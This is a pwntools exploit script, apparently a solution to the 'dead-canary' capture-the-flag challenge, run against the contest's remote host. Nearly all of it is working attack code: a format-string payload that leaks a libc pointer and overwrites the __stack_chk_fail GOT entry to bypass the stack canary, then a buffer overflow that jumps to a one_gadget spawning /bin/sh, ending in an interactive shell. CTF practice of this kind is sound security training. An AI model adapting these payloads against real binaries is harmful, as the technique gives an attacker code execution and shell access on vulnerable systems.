from pwn import *

elf = ELF("dead-canary")
libc = ELF("./libc.so.6")

p = remote("2020.redpwnc.tf", 31744)
# p = process("./dead-canary")

# format string bug - leak address in stack
# There is a pointer to _IO_stdfile_1_lock structure at stack position 2

# format string bug - write-what-where
# Overwrite __stack_chk_fail GOT entry to jump back to main (0x400737)

payload1 = (b"%02$" + str(0x0737 - 7).encode("ascii") + b"p\n").ljust(16) + b"%9$hn   " + p64(elf.got["__stack_chk_fail"]) 
payload1 += cyclic(0x120 - len(payload1))

p.send(payload1)
p.recvuntil("0x")

# magic number is offset to get to base libc address from _IO_stdfile_1_lock
libc_base = int(p.recvline().strip(), 16) - 3705408 - libc.sym["printf"]

info("libc base is at %x" % libc_base)

#
# $ one_gadget libc.so.6 
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#
one_gadget = 0x4f2c5

# overflow return address with one_gadget value
# stack canary will be overwritten again, it will again trigger call to main(), nothing scary.
payload2 = cyclic(0x120 - 8) + p64(libc_base+one_gadget)
p.send(payload2)

# main is called again. do nothing, don't overflow anything this time..
payload3 = "Hello!"
p.send(payload3)

p.interactive()